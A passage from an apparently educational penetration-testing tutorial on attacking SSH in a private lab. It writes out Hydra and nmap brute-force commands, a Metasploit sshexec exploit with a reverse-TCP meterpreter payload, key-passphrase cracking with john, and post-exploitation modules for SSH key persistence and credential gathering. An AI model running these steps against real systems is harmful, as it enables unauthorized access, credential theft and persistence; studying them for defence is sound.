@@ -1,0 +1,205 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
+            <h1 class="post-title entry-title">SSH Penetration Testing (Port 22)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/ssh-penetration-testing-port-22/" rel="bookmark"><time class="entry-date published" datetime="2020-01-11T09:50:46+00:00">January 11, 2020</time><time class="updated" datetime="2025-05-31T16:03:32+00:00">May 31, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <h3 class="ai-optimize-6"><span style="color: #800000;">Introduction</span></h3>
+<p class="ai-optimize-7 ai-optimize-introduction"><span style="color: #000000;">Secure Shell (SSH) is a cryptographic protocol that provides secure communication over an unsecured network. It is a secure alternative to the non protected login protocols (such as telnet, rlogin) and insecure file transfer methods (such as FTP). It’s commonly used for remote server management, secure data transfer, and other tasks requiring secure communication. This article will demonstrate different methods to connect and exploit a SSH service running on the target machine. By default the SSH service runs on the port 22 of the machine.</span></p>
+<h3 class="ai-optimize-8"><span style="color: #800000;">Table of Contents</span></h3>
+<ul>
+<li class="ai-optimize-9"><span style="color: #000000;">Lab Setup</span></li>
+<li class="ai-optimize-10"><span style="color: #000000;">Installation</span></li>
+<li class="ai-optimize-11"><span style="color: #000000;">Enumeration</span></li>
+<li class="ai-optimize-12"><span style="color: #000000;">Password cracking using Hydra</span></li>
+<li class="ai-optimize-13"><span style="color: #000000;">Authentication using Metasploit</span></li>
+<li class="ai-optimize-14"><span style="color: #000000;">Running commands on remote machine</span></li>
+<li class="ai-optimize-15"><span style="color: #000000;">SSH Port redirection</span></li>
+<li class="ai-optimize-16"><span style="color: #000000;">Nmap SSH brute force script</span></li>
+<li class="ai-optimize-17"><span style="color: #000000;">Enumerating SSH authentication methods</span></li>
+<li class="ai-optimize-18"><span style="color: #000000;">Key based authentication</span></li>
+<li class="ai-optimize-19"><span style="color: #000000;">Key based authentication(Metasploit)</span></li>
+<li class="ai-optimize-20"><span style="color: #000000;">Post exploitation using Metasploit</span></li>
+<li class="ai-optimize-21"><span style="color: #000000;">Local port forwarding (Password based authentication)</span></li>
+<li class="ai-optimize-22"><span style="color: #000000;">Local port forwarding (Key based authentication)</span></li>
+<li class="ai-optimize-23"><span style="color: #000000;">Conclusion</span></li>
+</ul>
+<h3 class="ai-optimize-24"><span style="color: #800000;">Lab Setup</span></h3>
+<p class="ai-optimize-25"><span style="color: #000000;">In this article we are first going to setup and configure the SSH server on the ubuntu machine and will exploit it using the SSH client on the kali linux machine. Following are the machines:</span></p>
+<p class="ai-optimize-26"><span style="color: #000000;">Target Machine: Ubuntu (192.168.31.205)</span></p>
+<p class="ai-optimize-27"><span style="color: #000000;">Attacker Machine: Kali Linux (192.168.31.141)</span></p>
+<h3 class="ai-optimize-28"><span style="color: #800000;">Installation</span></h3>
+<p class="ai-optimize-29"><span style="color: #000000;">Firstly, Install the SSH server on the ubuntu machine using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install openssh-server</pre>
+<p class="ai-optimize-30"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhgkOGekC-cjg9imw9L_SEn7-AYFXRxlsCd6f1zN12c5MQQ15_kpWJPhisRncG_xpb_EB5aTkuY9JFmk_qBZv-R06tQJaWqLQRo_Skpkt38pw5JA9yLuQU9IsyBGY9rANWbbn03hUzhwjeu-VVzhEv156vnEGTqQY62R-6UfQ7ZfzrzZ_zotyU81BsxWtRY/s16000/1.png"/></span></p>
+<p class="ai-optimize-31"><span style="color: #000000;">It can be noted that the SSH authenticates against the standard Unix user database (/etc/passwd, /etc/shadow, /etc/group), so the password to login into SSH for the user will be same which is used to login into the ubuntu machine.</span></p>
+<h3 class="ai-optimize-32"><span style="color: #800000;">Enumeration</span></h3>
+<p class="ai-optimize-33"><span style="color: #000000;">The initial enumeration can be performed using nmap inside kali linux by running the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV 192.168.31.205</pre>
+<p class="ai-optimize-34"><span style="color: #000000;">The port 22 is open and an OpenSSH 8.9p1 Service is running on it.</span></p>
+<p class="ai-optimize-35"><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCbhxrzHVlm3k9h_keb9LleU5xqtE-ZowD1Xa5BqRUpp5EKMR_nLAgBwiTRzKsYxsEjsi-CUXsOrWdqQaZYqMBFHe_kjba92NbrVsiwe9oevpHtH7ESy6OUGd6oUwWHWNDTn36kA2tXhehdBlU-JKe7noP0zP58u-RFgtOctx6t8ieRZC4-UXaMDptPwxT/s16000/2.png"/></strong></span></p>
+<h3 class="ai-optimize-36"><span style="color: #800000;">Password cracking using Hydra</span></h3>
+<p class="ai-optimize-37"><span style="color: #000000;">Since the authentication is password based hence the service can be brute forced against a username and password dictionary using <strong>hydra</strong> to find the correct username and password. After creating a username dictionary as <strong>users.txt</strong> and password dictionary as <strong>pass.txt</strong>, the following command can be used:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hydra -L users.txt -P pass.txt 192.168.31.205 ssh</pre>
+<p class="ai-optimize-38"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbytVf6OBlEWIB_AqRzpvlnBUzcwGhLjknTloydW6km5NxNTAuAjHJhSJuApRob5ZH8C5QGnFxc2c6IWh2kXLZvmJyCUXLlC6T399WWQsNBPEfLL1KKXDqQt5CnIeTTvJtVEBY-LNgkQbIEcHCtW77Fmw40KBfqj03Z3jfuQZpILHW3dTuniCejCapyd_u/s16000/3.png"/></span></p>
+<p class="ai-optimize-39"><span style="color: #000000;">After obtaining the username as <strong>pentest</strong> and the password as <strong>123</strong>, the attacker can now authenticate into the SSH service by using the command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh pentest@192.168.31.205</pre>
+<p class="ai-optimize-40"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihNGAvFx79jvpGxRSKBBHDJyFdDVts3hIYQsH9vksu62jXF38Oj0mFd4Gf2w8Th5a-UenhWPkOkk_suidKDuxPTPIS4X3H8qeBHl9r9T8AzYL4CPs1axfSgh29vgzPST1j74NQ3tj5Uv2fHrYe72ZU9FriyEE4l22Er40MzBC2k4u3bfgU7SafRTeg_D5r/s16000/4.png"/></span></p>
+<h3 class="ai-optimize-41"><span style="color: #800000;">Authentication using Metasploit</span></h3>
+<p class="ai-optimize-42"><span style="color: #000000;">An alternate way to perform the above procedure could be done by using the <strong>Metasploit</strong> module. The exploit <strong>multi/ssh/sshexec</strong> can be used to authenticate into the SSH service. Here we are assuming that the attacker has compromised the username and password already. Following will be the commands inside the Metasploit:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/ssh/sshexec
+set rhosts 192.168.31.205
+set payload linux/x86/meterpreter/reverse_tcp
+set username pentest
+set password 123
+show targets
+set target 1
+exploit</pre>
+<p class="ai-optimize-43"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjX1QkOfk9i8d8Xaw43d5RvVAVH7xDUgQBkJ9tgcaInQ-VFoSc-KdZC1xeZaIgo5uMHQKE2wGOiKEbhjT53BAaxoLjSXOURuCgxs8A_rEYJnWe-35oKg1cpLoNTQoO_Q8eohE0aEhcxvoxRrDDEyfwBO-DMGTKWcasi3Xk5dIyAVqdA3UiRcKemXyNurnix/s16000/5.png"/></span></p>
+<h3 class="ai-optimize-44"><span style="color: #800000;">Running commands on remote machine</span></h3>
+<p class="ai-optimize-45"><span style="color: #000000;">SSH service can also be used to run the system commands on remote machine. The following command can be used:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh pentest@192.168.31.205 'ifconfig'</pre>
+<p class="ai-optimize-46"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi2ig9maZq1T7TuCoGD-_1ArV-VkYY3feJxvM0GdmnGHG8Iw4SVY7nrYrWaab8e9V47qDoUZG7hr3dyetCEI0NsomYhXMTAX1AUjBX-UpyETs9C4LslBZgqQhQ5_8u2KZHwTv1ZrhlpiisVP8u70m2qKGmpoxdyjElsDDvRCTO_5v5DdRfvHc-CWWdWN4tk/s16000/5_2.png"/></span></p>
+<h3 class="ai-optimize-47"><span style="color: #800000;">SSH Port redirection</span></h3>
+<p class="ai-optimize-48"><span style="color: #000000;">By default, SSH uses port 22 which comes under the well known ports list. However, we can enable the SSH service to run on any alternate port number by performing the port redirection. The port redirection can be performed by changing the port number in the <strong>sshd_config</strong> file.</span></p>
+<p class="ai-optimize-49"><span style="color: #000000;">As a <strong>root</strong> user we will first open the <strong>sshd_config</strong> file present inside the <strong>/etc/ssh</strong> directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /etc/ssh
+ls -al
+nano sshd_config</pre>
+<p class="ai-optimize-50"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiX6VUJKjeFIzyZT21XtMgVihBMaHexgFIWPXJc_iuFLNf4hAXIYi0fmRmObSOiW3PvNfqsHmWOHKayef4VSB9_j2WGGWkH-AtzgG144X9-C-JJh-fwd6gN1_QmaJ9tDGlr47QiXQ5wfkN6yEytuaz7-06rhe9bbu3crOfVxpGTdlul8-Hb0YoKGTLk29VG/s16000/6.png"/></span></p>
+<p class="ai-optimize-51"><span style="color: #000000;">The default port can be seen here as <strong>22</strong> in the commented line.</span></p>
+<p class="ai-optimize-52"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZPPHTeMbD0rik9GVXGgzBJRlhgZV7_xy8NIlai4kvFVNsrSfkEKLZlnSOY4JiYUtwIkZRQgReKx_YEWatsJbpujX4xsKK3EUV41-_xL0IUVScpFwq5eSqdID2bha_whV6VzJiBA3boJhHZWuBHk_G673wJGBW5j-oKIuz-0iz0XJ-Mm_qPu9mQV0MnGQB/s16000/7.png"/></span></p>
+<p class="ai-optimize-53"><span style="color: #000000;">The port can be changed to <strong>2222</strong> by removing the commented line as <strong>Port 2222</strong>.</span></p>
+<p class="ai-optimize-54"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiEIEYtO4rJ0YwfMwT1BAdJKDLZLahvFf_CAEk-rAEgEnY4NZtHK4Dqt6Cg4LIIT6v9PzpN0cm1wdFZeVtrMIeHOutckHJUgud6LYgNkRV7EHa9ACpmoVHz76V3OK-YY1l7CvLU_ojjbCtVMSYHqjkJayGtNXLfiGIU3oW65KRcpznPf2FavCSqGUfvl7yI/s16000/8.png"/></span></p>
+<p class="ai-optimize-55"><span style="color: #000000;">After saving the changes in the file, the enumeration performed using kali linux now shows the SSH service running on the new port number which is 2222.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV 192.168.31.205</pre>
+<p class="ai-optimize-56"><span style="color: #000000;">Also, while performing the brute force using <strong>hydra</strong>, the updated port needs to be given. Hence, the new command will be:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hydra -L users.txt -P pass.txt 192.168.31.205 ssh -s 2222</pre>
+<p class="ai-optimize-57"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgAcpcrUgas-lvZmrrfYrzabFnLCrTCcujpSM3NY4Kjp-L_vm8rDK75BR5G6ryEDWeFlsyQ8zitGFVtrnvWTx24bpZXoEvkvNa9golLDV_H-pbNNP0IatOlakMaColhJn8Gu0-KSgdGbx0gpW-NuY32iogW15K030ueXBmZEaWM5NBQfJ4YPIS-ralncTLd/s16000/9.png"/></span></p>
+<h3 class="ai-optimize-58"><span style="color: #800000;">Nmap SSH brute-force script</span></h3>
+<p class="ai-optimize-59"><span style="color: #000000;">There are a lot of default scripts in the nmap repository which can be used if the port 22 is open. Here we will talk about the most common script used to brute force the username and password. The script used to perform is the ssh-brute script which uses a default username file from the <strong>nselib/data/usernames.lst </strong>and default password file from <strong>nselib/data/passwords.lst</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap --script ssh-brute -p 22 192.168.31.205</pre>
+<p class="ai-optimize-60"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjatrlR8bzVpfjN-AhOBhmhlZOf9kg3SIrpC-AP7-eHA7d1i_cCkyma-HxIFiL8IaUw6G7MJrCYVvnMB2fjDQP1QvABqV8UA_XKBjURVRaBVi23YVtd18_mJ53bd1FeT4t1ptktGTD-Dbg4EyLOgo49-4fAABUiqV39PN4p6Tw4Pga3IYBMreO18VXTbc7U/s16000/10.png"/></span></p>
+<p class="ai-optimize-61"><span style="color: #000000;">We can also give the custom username and password file by giving the flag <strong>–script-args</strong> <strong>userdb=usernames.txt,passdb=passwords.txt</strong>.</span></p>
+<h3 class="ai-optimize-62"><span style="color: #800000;">Enumerating SSH authentication method</span></h3>
+<p class="ai-optimize-63"><span style="color: #000000;">The SSH authentication method can be enumerated by using the <strong>ssh-auth-methods </strong>script in nmap, the username can be given using the <strong>–script-args</strong> flag. The following command can be used to enumerate the authentication method used:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap --script ssh-auth-methods --script-args="ssh.user=pentest" -p 22 192.168.31.205</pre>
+<p class="ai-optimize-64"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjNrV-6l7rPHPUCsUkyRKxdMBAEsC3qfprOESC8pRXH4S6q_TMKQQEwswmCAxN-_taf-j5yKJqs7VLR10NcxPlap3tes1Bw_ata2bKzFWzsPBayJhNPsQOKDN1P4JSD2OfKs_MyxrY2QrMiBF_Hhv7MUHyr95rdt7IBDIp3veYwtQJWCcuRsAqXaIxC7l4h/s16000/11.png"/></span></p>
+<p class="ai-optimize-65"><span style="color: #000000;">The above command enumerated that the authentication type used by the SSH service is both <strong>publickey </strong>and <strong>password</strong> based.</span></p>
+<h3 class="ai-optimize-66"><span style="color: #800000;">Key based authentication</span></h3>
+<p class="ai-optimize-67"><span style="color: #000000;">SSH key based authentication offers a secure and user-friendly method for accessing remote servers without relying on passwords. This technique employs a pair of cryptographic keys: a private key stored on your local device and a public key saved on the remote server.</span></p>
+<h5 class="ai-optimize-127"><strong><span style="color: #000000;">Generating SSH Key Pair with Passphrase</span></strong></h5>
+<p class="ai-optimize-68"><span style="color: #000000;">The public and private key pair can be generated using the <strong>ssh-keygen </strong>tool inside the ubuntu machine. A <strong>passphrase</strong> is also setup for the <strong>id_rsa</strong> key such that when the user will login using the key based authentication, a passphrase will also be required. By default, the path to store the <strong>id_rsa</strong> and <strong>id_rsa.pub</strong> is the <strong>.ssh</strong> folder of the user’s home directory i.e., <strong>/home/pentest/.ssh/id_rsa</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh-keygen</pre>
+<p class="ai-optimize-69"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQVujKJQILn0yavJBGNZI2jEs-XkMagMKvzg6cK0HMlqId9gWLNl-LD_tXipYvoooHxQKX6_3IU-P1h1K6gC4ZrJyhpk2R2whyphenhyphenx8cYc-uDOFByMCnwKs3fewNmIvQDSl6uVTWeIOhhkBiAJFIW0SiGjtqohQGROVjmYByB7mwRmu7CnhKoYvJrQTKqJiM0/s16000/15.png"/></span></p>
+<p class="ai-optimize-70"><span style="color: #000000;">Next step is copying the public key (<strong>id_rsa.pub</strong>) to the <strong>authorized_keys</strong> file in the same directory.</span></p>
+<p class="ai-optimize-71"><span style="color: #000000;">The <strong>authorized_keys</strong> file on the remote server contains a list of public keys that are authorized to access the server. By copying the public key (id_rsa.pub) to this file, we are telling the server to trust any connection that presents the corresponding private key.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd .ssh
+ls -la
+cat id_rsa.pub &gt; authorized_keys
+ls</pre>
+<p class="ai-optimize-72"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMwb3wlogcgzc9-9xo1TxxgD8y7NBhoP6BogyP_dFnImdzBQXfByX5aiK4rpFyVmMWYSalNL1tHAdQHmjOXsUHpmlXAtu1aqmrQh9Kvq5_3jsC1nOeXuI910BajSmngC4YBdcDZ-Pw74ubQsMoL-ijnSmBnTIzEZZLvijFYdNbXK43KezwB0hjtk1hdWH3/s16000/16.png"/></span></p>
+<h5 class="ai-optimize-128"><strong><span style="color: #000000;">Disabling Password-Based Authentication</span></strong></h5>
+<p class="ai-optimize-73"><span style="color: #000000;">Then, we can disable the password based authentication in the <strong>/etc/ssh/ssd_config </strong>file. There is commented line <strong>#PasswordAuthentication</strong> which is set to <strong>yes</strong>.</span></p>
+<p class="ai-optimize-74"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8iHgDqqlmr2EzwD7qAIhdwCagcazkvOrdsxnIhBESZK_2TqEotVxjddXJ3PTkBi18Fp8Hz-up-DhxiG1U2SJnss8S1HE48zgvet2BA8w73MPy2XIwaWkxgsGSQctclA5i4L0-Tlq1rd1MnRKTKEk8wduAELmKimU6KoohPt7IcJpf6i2M00anDJT50CY_/s16000/17.png"/></span></p>
+<p class="ai-optimize-75"><span style="color: #000000;">We can change it to <strong>no</strong> and remove the comment from the line to allow the key based authentication and disable the password based authentication.</span></p>
+<p class="ai-optimize-76"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhMRtQFL2FjxcAx550Qx4aDvb6Cc3qkZoBR9g6ZC6XTIgesEkgcVPwLFECpl4_0i9DKXL6iR7HbOlHIyxj91qwC3PvOeC3S5-hFuraFfL-CxPOxD84XyAtgcJ8qTCbwpnAfbl_8w3hM_lK72AfVoz6NRTGLbxmrJU8cGVACP4uKcGBfHbA5TAmONpiGUUmh/s16000/18.png"/></span></p>
+<p class="ai-optimize-77"><span style="color: #000000;">Again enumerating the service using the <strong>ssh-auth-methods</strong> script, it shows that the support authentication method is only <strong>publickey</strong> now. Therefore a key is required to login into the system using this service.</span></p>
+<p class="ai-optimize-78"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgANOjtVykS_jhlUmFeEl4KBdyhCSQedoUDz1_2nyqWMu_RJTFx8Jz43N79e1LkzMhIdHuNvdEt-0WcdlLJeCPCD8PqgWqCPPw6ArxqXTbDY0EYi-lG75naEWSxmCe0q4nVUsrAk8YvH2zqvGnXgnXmiF3pNLWZVLLRoKkFm3cZYWobOWEoyxeYN0_1uECG/s16000/19.png"/></span></p>
+<p class="ai-optimize-79"><span style="color: #000000;">Let’s assume a scenario where we can somehow get the private key of the ubuntu user, then we can directly login using the key based authentication. However, we have to give the private key <strong>read</strong> and <strong>write</strong> privilege to the <strong>owner </strong>but we should take precaution that we are not giving the key <strong>over permissions</strong>. To give appropriate permissions we will use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 600 id_rsa</pre>
+<p class="ai-optimize-80"><span style="color: #000000;">Now we can use the private key to authenticate into the service.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -i id_rsa pentest@192.168.31.205</pre>
+<p class="ai-optimize-81"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhKSFHwxlrGphVapRFMMkMgCnlDrabf-olNMjh3TXO8G0YTTJQMgVnEDjdBQwm0kbuntIM0Jm0Aekjmdb08hza1URSfhIHad4Oa6lIFUDLUTF7eRh0slukuayoyk-dL_nGjjeqj42bUBIOq5HQdca9W0vZ5dvtApKTlzMTRaWCdIQAjjJpQRA2u2eVY4NFS/s16000/20.png"/></span></p>
+<h5 class="ai-optimize-129"><strong><span style="color: #000000;">Cracking the SSH Key Passphrase</span></strong></h5>
+<p class="ai-optimize-82"><span style="color: #000000;">As we had already setup a <strong>passphrase</strong> earlier while generating the private and public key using ssh-keygen, we need to crack the passphrase. There is an inbuilt tool in kali linux called as <strong>ssh2john</strong> which generates the password hash of the private key. The obtained password hash can be cracked using <strong>john the ripper</strong> tool.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh2john id_rsa &gt; sshhash
+john --wordlist=/usr/share/wordlists/rockyou.txt sshhash</pre>
+<p class="ai-optimize-83"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgjZlQWKnm4puTNRA3SHIJArAMQD-yQToZjo8zjF4S4Q9cKPERtWAKlV0pGPjiuPiTxmlc-YMlJ_7stc_fsfL4GOefNxne2sMmxgVWv9X9DVAx-ac0ieDOxOPLPURh5miqKGQyTfmDME-kx5zQQjwiJpf2pzSXCU4anQiwznuzBOFV2ZYaWNOdL0hXcsnmz/s16000/21.png"/></span></p>
+<p class="ai-optimize-84"><span style="color: #000000;">The cracked passphrase is <strong>123</strong>, now we can login using the private key into the remote system.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -i id_rsa pentest@192.168.31.205</pre>
+<p class="ai-optimize-85"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhNuZnpxnLQLuIGrieUmCrg745btAwKUAQHiHm7ETGE3PtGuYjbmtww9wygGSgXCsxvzTaP1IwZ8wBSYfgelJWk2x90gIMaO86TA-ci1LDBVPQ6KVs2hzLbZvMMUsV_l0UaTEw8UGzJJaX3zD5pK6FsHx1x7gBnyb_So-jwcWTEP0nwc2M2-wi_pRtuwS9J/s16000/22.png"/></span></p>
+<h3 class="ai-optimize-86"><span style="color: #800000;">Key based authentication (Metasploit)</span></h3>
+<p class="ai-optimize-87"><span style="color: #000000;">The above procedure can also be performed using the Metasploit framework. The <strong>auxiliary/scanner/ssh/ssh_login_pubkey</strong> can be used to authenticate via key.</span></p>
+<p class="ai-optimize-88"><span style="color: #000000;">Following options can be given as configurations to run the auxiliary/scanner:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/ssh/ssh_login_pubkey
+set rhosts 192.168.31.205
+set key_path /root/Downloads/ssh/id_rsa
+set key_pass 123
+set username pentest
+exploit</pre>
+<p class="ai-optimize-89"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgln2WFq_Fk2AOXSBx9DHsEFFyYpxQg8PprUPbq9NLu41fqhXcqbzpzGhFXeukPhBuiqvL3Rl0pdXUNzwohwfbbvl_EAcvLD6qPMx2BNpSBYVqhNWy91E5tddfUBPm-Y-JeSZGrc6h-5VshIqeXHo_IaqjRiUViHc6B_X0sNkc4ibdo1NdDrN-5-pL5LAqH/s16000/23.png"/></span></p>
+<p class="ai-optimize-90"><span style="color: #000000;">After running the auxiliary, the user is enumerated and also a shell session is opened. The <strong>shell</strong> session can be upgraded to the <strong>meterpreter</strong> session to get more options. Following are the commands to upgrade an existing shell session to a meterpreter session.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sessions
+sessions -u 1
+sessions</pre>
+<p class="ai-optimize-91"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjdCoagxzE_rWRSieVFZqpuACQjNLARD5qmYOh2IzhkQFVAKV4IBDGwGfmU0IXrfnOEsbEl-RUO_lIZUs5gSOOuo27J_e8RGBrjQslpkhDfFPf0nGTyPohz8glOAT-oXaY3ZYkR5gmvMRUkm-finpIFRh8mI1dNgjhObcEtogkBZy9crmSq9P6I1QTYczfM/s16000/24.png"/></span></p>
+<h3 class="ai-optimize-92"><span style="color: #800000;">Post exploitation using Metasploit</span></h3>
+<p class="ai-optimize-93"><span style="color: #000000;">After getting the meterpreter session, to create persistence the post exploit can be used to save the private key of the user in the attacker ‘s machine.</span></p>
+<p class="ai-optimize-94"><span style="color: #000000;">The post exploit used here is the <strong>linux/manage/sshkey_persistence</strong> and the private key is stored at the <strong>/root/.msf4/loot/</strong> directory in the kali machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sessions
+use post/linux/manage/sshkey_persistence
+set session 1
+exploit</pre>
+<p class="ai-optimize-95"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3ioLVmlUlMT9ejxiyKlMxcng-e5ZOj6S7zyvfMsByyQ-muLt4gBFCd0hgCOfC85YfTJzZLlnGLrTYWRFpGxwvjnAdf62dExXPoov4e5oM9diELr3KpP4IVqWqPF_Fzs1osr3C7xuqi2MImLiIv468dj6SuXL_24rdc2DPgBo5I_ld41Vo-lcD8F-235lu/s16000/25.png"/></span></p>
+<p class="ai-optimize-96"><span style="color: #000000;">Then, once the private key is obtained, we can again login into the SSH service using the key based authentication as discussed in the previous section.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /root/.msf4/loot
+mv 20240603061535_default_192.168.31.205_id_rsa_575464.txt key
+chmod 600 key
+ssh -i key pentest@192.168.31.205</pre>
+<p class="ai-optimize-97"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZOTX-UTGUUviUb7L95xgtSgeGzvowLuaPufjD_xAendT4oqmaor3P9HkPOJOrCWul2EZMmnRSVgrgLq7mLKkqroACGknNkSUWWJIBE9AOhS9_m2KY-eX8LVlmRAZa91HTkzyDshPSouVZQ8yb9z49rbs1Cr5lsPpfLjJuAqj9Mj1idzQCBxxStC-6Sndd/s16000/26.png"/></span></p>
+<p class="ai-optimize-98"><span style="color: #000000;">There is another post exploit module which we can use to gather all the files inside the <strong>.ssh</strong> directory of the user whose initial shell access has been taken.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/multi/gather/ssh_creds
+set session 1
+exploit</pre>
+<p class="ai-optimize-99"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjjmFhBg27JdSErpDjAMeaQ7iEeBowj7mQA9YBi_NKaSqV6ToOb1ZS88ULfVOEx9XO4pDPSt3y49SjIDCP4AqHu7xSEwy_ndt5M1uwhyOa8E3NXo28t9Ur7CKoeJKJmJihWYXku1EPNq5JlvwutirvHgEeLdAG-FA4yuYhIsmRlXoNOVo4K8xxGiO0JJii9/s16000/29.png"/></span></p>
+<p class="ai-optimize-100"><span style="color: #000000;">After the files have been obtained in the <strong>/.msf4/loot/</strong> folder now the process can be repeated to authenticate into the remote system using key based authentication.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls -al
+mv 20240603061910_default_192.168.31.205_ssh.id_rsa_527520.txt key
+chmod 600 key
+ssh -i key pentest@192.168.31.205</pre>
+<p class="ai-optimize-101"><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWIjkmy8VfcSeBj3awAGCPXg0hFsHrZeM7TCFan2yBVam-3r-xC8DlM1zS812fOG5YFc-k0Opdco5ljyUX6R9gVSwE5Q37NWvKv9pu5uCC3AKyjSgFCgbj6SyGq3bWbx8IlX_v1PXKk9CbLEhUlYGQAnnWupEdZYyzDl7FN6eD7AdLeUXioAHZOa8Nkzex/s16000/30.png"/></span></p>
+<h3 class="ai-optimize-102"><span style="color: #800000;">Local Port Forwarding (Password Based Authentication)</span></h3>
+<p class="ai-optimize-103"><span style="color: #000000;">Let’s assume a scenario where we have an initial access and there is a web application running on the target machine internally at port 8080, directly we cannot access the web application in our browser. But through the Local port forwarding supported by SSH we can access the web application on our kali machine. Local port forwarding forwards a port on the local machine to a port on a remote server through an SSH connection.</span></p>
